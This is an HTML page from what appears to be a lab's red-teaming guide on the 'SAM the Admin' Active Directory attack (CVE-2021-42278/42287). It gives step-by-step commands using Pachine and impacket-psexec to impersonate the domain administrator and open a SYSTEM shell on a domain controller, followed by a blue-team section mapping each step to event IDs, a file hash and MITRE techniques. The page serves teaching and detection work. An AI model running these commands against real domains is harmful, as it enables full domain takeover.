@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="http://ab8910.pages.labranet.jamk.fi/7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/" />
+      <link rel="shortcut icon" href="../../../img/favicon.ico" />
+    <title>SAM the Admin - Red-Teaming Tools Usage Guide</title>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "SAM the Admin";
+        var mkdocs_page_input_path = "7-privilege-escalation/sam-the-admin/sam-the-admin-OLD.md";
+        var mkdocs_page_url = "/7-privilege-escalation/sam-the-admin/sam-the-admin-OLD/";
+      </script>
+    
+    <script src="../../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../.." class="icon icon-home"> Red-Teaming Tools Usage Guide
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Preparation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../1-preparation/phases/">Attack Chain</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reconnaissance</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../2-recon/hak5/hak5/">Shark Jack</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Initial Access</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/bitb/bitb/">Browser-in-Browser</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/evilnovnc/EvilnoVNC/">EvilNoVNC</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/dll-hijack/dll-hijack/">DLL Hijack</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Local Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../5-local-privilege-escalation/localpotato/LocPotato/">LocalPotato</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/">StorSvc Abuse</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../5-local-privilege-escalation/sigflip/sigflip/">SigLoader</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Command and Control</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../5-local-privilege-escalation/sliver/sliver/">Sliver</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Credential Access</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../3-resource-development/keepass-password-dumper/keepass/">Keepass Password Dumper</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Domain Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../sam-the-admin/">SAM the Admin</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../..">Red-Teaming Tools Usage Guide</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+      <li>SAM the Admin</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="sam-the-admin">SAM the Admin</h1>
+<h2 id="background">Background</h2>
+<p>This attack is used for exploiting vulnerabilities <code>CVE-2021-42278</code> and <code>CVE-2021-42287</code>. </p>
+<p>By default, a standard domain user can join a computer to an Active Directory domain a maximum of 10 times. To distinguish user accounts from computer accounts, the latter should have a trailing <code>$</code> in its sAMAccountName attribute. </p>
+<p>The attacker first creates a new machine named "<em>dc</em>" without the trailing <code>$</code> and requests a <em>Ticket Granting Ticket</em> (TGT) for this account. After receiving the TGT, the machine account "dc@DOMAIN" is renamed. After renaming, no computer named "dc" exists in the domain. One key issue arises when a <em>Ticket Granting Service</em> (TGS) is then requested for an account that doesn't exist.  When account "dc" is not found, <em>Key Distribution Center</em> (KDC) automatically tries appending the missing <code>$</code>. This leads to the machine account name resolving to  <code>dc</code> + <code>$</code>  = <code>dc$</code> (domain controller). If the Key Distribution Center also doesn't force the use of <em>Privilege Attribute Certificate</em> in TGTs, the vulnerability can be exploited. </p>
+<p>The version (or build) of the Windows cannot be used to undeniably define whether or not the target is vulnerable. Instead, it should be checked if certain updates have been installed or not. If not, the target is most likely vulnerable.</p>
+<h4 id="requirements">Requirements</h4>
+<p>There are few practical requirements for this exploit to be usable:
+- The domain controller must be vulnerable
+- The abused service must have a <em>Service Principal Name</em> (SPN) set
+- Attacker must have valid credentials to an AD account to (mis)use
+-  The account "misused" <strong>must be delegated to the abused service's SPN</strong></p>
+<h2 id="setup">Setup</h2>
+<h3 id="tools-required">Tools required</h3>
+<ul>
+<li>krb5-user (from Linux repository)</li>
+<li>Pachine, https://github.com/ly4k/Pachine<ul>
+<li>requires: <em>Impacket</em></li>
+</ul>
+</li>
+</ul>
+<h3 id="environmental-requirements">Environmental requirements</h3>
+<ul>
+<li>Domain controller not patched with November 2021 updates (KB5008102 and KB5008380)</li>
+</ul>
+<p><br></p>
+<h3 id="installation">Installation</h3>
+<p style="color:red"> The container is configured to take these steps automatically.</p>
+
+<ul>
+<li>Install <em>krb5-user</em>: <code>$sudo apt-get install krb5-user</code><ul>
+<li>During the installation, give following values:<ul>
+<li><strong>Default Realm</strong>: RT.VLE.FI</li>
+<li><strong>Kerberos Servers</strong>: DC.RT.VLE.FI</li>
+<li><strong>Administrative Server</strong>: DC.RT.VLE.FI</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><br>
+- Clone <em>Pachine</em> from Github: 
+    - <code>$git clone https://github.com/ly4k/Pachine</code></p>
+<p><br></p>
+<ul>
+<li>Install <em>Impacket</em> required for Pachine, if not installed already<ul>
+<li><code>$pip3 install impacket</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="docker">Docker</h3>
+<p>A docker image has been provided which includes the following tools:  </p>
+<p><code>Impacket</code> in the /opt -directory<br />
+<code>Pachine</code>  in the /opt -directory<br />
+<code>SSH</code><br />
+<code>Proxychains</code>   </p>
+<h5 id="firing-up-the-docker-container">Firing up the Docker container</h5>
+<p>A <em>dockerfile</em> has been provided in the repository. Using it, build the image and run the container by running command </p>
+<pre><code class="language-bash"># 1. go to directory with the dockerfile
+
+# 2. Build the Docker image, name it with arg specified with -t
+$docker build . -t my_container_name
+
+# 3. Run the container and open a shell there.
+$docker run -it my_container_name &quot;/bin/bash&quot;
+
+# 4. Carry out the mandatory configuration of the file /etc/hosts (instructions below)
+</code></pre>
+<h5 id="mandatory-configurations-inside-the-container">Mandatory configurations inside the container</h5>
+<ul>
+<li>Add entry of DC's IP-address to <em>/etc/hosts</em>:  <ul>
+<li><code>&lt;DC_IP&gt; dc.rt.vle.fi rt.vle.fi</code></li>
+</ul>
+</li>
+</ul>
+<p><br></p>
+<h2 id="attack-steps">Attack steps</h2>
+<ol>
+<li>Use <em>pachine.py</em> (found in cloned Pachine directory) to check if the machine is vulnerable.</li>
+</ol>
+<p><code>$python3 pachine.py -dc-host [DC FQDN] -scan "[DOMAIN]/[USERNAME:PW]"</code></p>
+<p><img alt="Checking if the DC could be vulnerable." src="../images/impacket/3-vulnerability-check_v2.png" /></p>
+<p><br></p>
+<ol>
+<li>Using <em>pachine.py</em>, acquire administrator's Kerberos ticket. This ticket is saved for a .ccache file in the current directory.</li>
+</ol>
+<p><code>$python3 pachine.py -dc-host [DC FQDN] -spn cifs/[DOMAIN] -impersonate administrator '[DOMAIN]/[USERNAME]:[PW]'</code></p>
+<p><img alt="" src="../images/impacket/4-impersonate_v2.png" /></p>
+<p><br></p>
+<ol>
+<li>Export path of the .ccache file to an environmental variable called <strong>KRB5CCNAME</strong>. Check the local directory for the file if needed. After the export valid Kerberos tickets can be checked.</li>
+</ol>
+<p><code>$export KRB5CCNAME=$PWD/[CCACHE_FILE_NAME]</code></p>
+<p><code>$klist</code></p>
+<p><img alt="" src="../images/impacket/5-ticket_to_env_var_v2.png" /></p>
+<p>NOTE: If you use auto-completion (TAB) to fill the ccache filename into the export command, terminal may automatically escape the dollar sign in <code>$PWD</code>. Make sure the dollar sign is <strong>not</strong> escaped.</p>
+<ol>
+<li>Open a shell on the DC as user "system" with the following command:</li>
+</ol>
+<p><code>$impacket-psexec -k -no-pass [DOMAIN]/administrator@[DOMAIN]</code></p>
+<p><img alt="" src="../images/impacket/6-open-system-shell_v2.png" /></p>
+<ol>
+<li>Enjoy!</li>
+</ol>
+<h2 id="for-blue-teams">For blue teams</h2>
+<p>The attack leaves traces in Windows event logs, Windows Active Directory and most likely to the ADMIN$ share of the domain controller. </p>
+<h3 id="attack-traces">Attack traces</h3>
+<p>Traces were mapped to attack procedures whenever possible. Listed attacker procedures might not be separate manual actions carried out by the attacker. Listed procedures can be smaller actions induced by a single command executed by the attacker. </p>
+<h4 id="step-1-pachinepy-scan">Step 1 - Pachine.py, scan</h4>
+<p>During the first step the attacker scans the domain controller for vulnerability. The table below shows the attack procedures during the first of the attack in terms of their respective traces and their source/ location.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Attack procedure</th>
+<th align="center">Trace type / location</th>
+<th align="center">IoC / trace</th>
+<th align="center">Additional info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">Request TGT without a PAC for regular user X</td>
+<td align="center">Windows Event Log</td>
+<td align="center">Kerberos TGT Request, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">Event 4768</a></td>
+<td align="center">Differs from "normal" TGT request by requesting a ticket specifically <strong>without</strong> PAC</td>
+</tr>
+<tr>
+<td align="center">Request TGT with a PAC for regular user X</td>
+<td align="center">Windows Event Log</td>
+<td align="center">Kerberos TGT Request, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">Event 4768</a></td>
+<td align="center">Normal TGT request, hard to distinguish from bad actions</td>
+</tr>
+</tbody>
+</table>
+<h4 id="step-2-exploitation-admin-impersonation">Step 2 - Exploitation, Admin  Impersonation</h4>
+<p>Attackers can use regular user's credentials to add a machine account to the domain. A series of other procedures are executed to induce the DC to yield a TGS for Administrator user. Actions before administrative access are executed as regular user X (victim). </p>
+<table>
+<thead>
+<tr>
+<th align="center">Attack procedure</th>
+<th align="center">Trace source / location</th>
+<th align="center">IoC / trace</th>
+<th align="center">Additional info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">Add new machine account named ""<strong>dc</strong>"" to the domain</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Machine Account Creation, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4741">Event 4741</a></td>
+<td align="center">EventData contains TargetUserName "dc", <strong>note:</strong> The machine account name doesn't end with <code>$</code></td>
+</tr>
+<tr>
+<td align="center">Request TGT for machine account "dc"</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Kerberos TGT Request, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">Event 4768</a></td>
+<td align="center">EventData contains TargetUserName "dc"</td>
+</tr>
+<tr>
+<td align="center">Change machine account name "dc" to "DESKTOP-NNNNNNNN$"</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Machine account name changed, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4781">Event 4781</a></td>
+<td align="center">EventData contains OldTargetUserName "dc"</td>
+</tr>
+<tr>
+<td align="center">Request TGS for machine account "dc" using S4U2Self functionality</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Kerberos TGS Request, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769">Event 4769</a></td>
+<td align="center">EventData contains TargetUserName "dc@" + DOMAIN_NAME</td>
+</tr>
+<tr>
+<td align="center">Change server name from dc@DOMAIN to cifs/DOMAIN@DOMAIN</td>
+<td align="center"><strong>UNK ?</strong></td>
+<td align="center">-</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">Change machine account name "DESKTOP-NNNNNNNN$" to "dc"</td>
+<td align="center">Windows Event Log</td>
+<td align="center">Machine account name changed, <a href="">Event 4781</a></td>
+<td align="center">EventData contains NewTargetUserName "dc" and OldTargetUserName "DESKTOP-NNNNNNNN\$".</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Note:</strong> Each <em>N</em> in machine name "DESKTOP-NNNNNNNN$" stands for a randomly generated character by the attacker. </p>
+<p>The figure below demonstrates a situation where the attacker has added a machine "dc" to domain. Note the missing <code>$</code> in machine's name. </p>
+<p><img alt="suspicous computers" src="../images/Sam-event-logs/suspicious-computers.jpg" />  </p>
+<p>In the figure below the attacker has renamed <code>DESKOP-NNNNNNNN$</code> back to <code>dc</code>.  </p>
+<p><img alt="event4781" src="../images/Sam-event-logs/event4781.jpg" />  </p>
+<h4 id="step-3-exporting-krb5ccname-to-env-vars">Step 3 - Exporting KRB5CCNAME to env. vars</h4>
+<ul>
+<li>No attacker actions which would leave traces to target system or network.</li>
+</ul>
+<h4 id="step-4-impacket-psexec">Step 4 - Impacket PsExec</h4>
+<p>The attacker uploads a randomly named <strong>RemComSvc</strong> utility binary to the target machine's writable share via SMB and creates a service. The length of the random named executable is approximately 7 to 9 characters (excluding the .exe extension). The service's name is typically 4 charaters long.   </p>
+<table>
+<thead>
+<tr>
+<th align="center">Attack procedure</th>
+<th align="center">Trace source / location</th>
+<th align="center">IoC / trace</th>
+<th align="center">Additional info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">Shares requested on target IP</td>
+<td align="center">UNK</td>
+<td align="center">UNK</td>
+<td align="center">-</td>
+</tr>
+<tr>
+<td align="center">Upload <RND_STR>.exe to share</td>
+<td align="center">Propable file artifact / C:\Windows\<RND_STR>.exe / DC</td>
+<td align="center">Executable with MD5sum: <code>6983f7001de10f4d19fc2d794c3eb534</code>, <strong>may get deleted if the attacker's shell session exits gracefully</strong></td>
+<td align="center">Located very likely under <code>C:\Windows\</code>, share used for access very likely <code>ADMIN$</code>, File checksum is a certain IoC</td>
+</tr>
+<tr>
+<td align="center">Create service to execute <RND_STR>.exe</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Service Control Manager, <a href="https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html">Event 7045</a> ( event 7045 is a "legacy" version of <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697">Event 4697</a>)</td>
+<td align="center">Announcement of a new created service (NNNN)</td>
+</tr>
+<tr>
+<td align="center">Start the service to execute <RND_STR>.exe</td>
+<td align="center">Windows Event Log / DC</td>
+<td align="center">Service Control Manager, <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697">Event 7036</a>]</td>
+<td align="center">Announcement of the (attacker's) service (NNNN) having entered running state</td>
+</tr>
+</tbody>
+</table>
+<h2 id="edr-detection">EDR detection</h2>
+<p>This exploit was tested against Windows Server 2012 with FireEye Endpoint Security Client, version 33.46.6. FireEye did not detect the attack. FireEye EDR did not generate alerts on the EDR service in the Labranet RT environment.</p>
+<h3 id="cwe-and-mitre-attck">CWE and MITRE ATT&amp;CK</h3>
+<p>CWE-269: Improper Privilege Management  </p>
+<p><strong>TA0001 - Initial access:</strong><br />
+T1078 - Valid accounts<br />
+* Attacker needs a valid account on the domain to execute the attack.  </p>
+<p><strong>TA0003 - Persistence</strong><br />
+T1078 - Valid accounts
+* The attacker can maintain access to network resources through the compromised or newly created accounts.  </p>
+<p><strong>TA0004 - Privilege escalation</strong>  </p>
+<p>T1134 - Access token manipulation<br />
+* By exploiting the vulnerability, attackers can create TGS for any user in the domain to the CIFS service (If the victim is assigned to that service). Gaining access to the CIFS service allows attackers to access domain controller's network shares as domain administrator. </p>
+<p>T1078 - Valid accounts<br />
+*  The attacker gains access to a valid account on the domain.  </p>
+<p><strong>TA0006 - Credential access</strong><br />
+T1558 - Steal or forge kerberos tickets<br />
+* The attacker can request the administrator's ticket because of account name handling on the Key Distribution Center.</p>
+<p><img alt="MITRE ATT&amp;CK" src="../images/Sam-event-logs/CVE202142278-MITRE-ATTCK.svg" /></p>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme_extra.js" defer></script>
+    <script src="../../../js/theme.js" defer></script>
+      <script src="../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
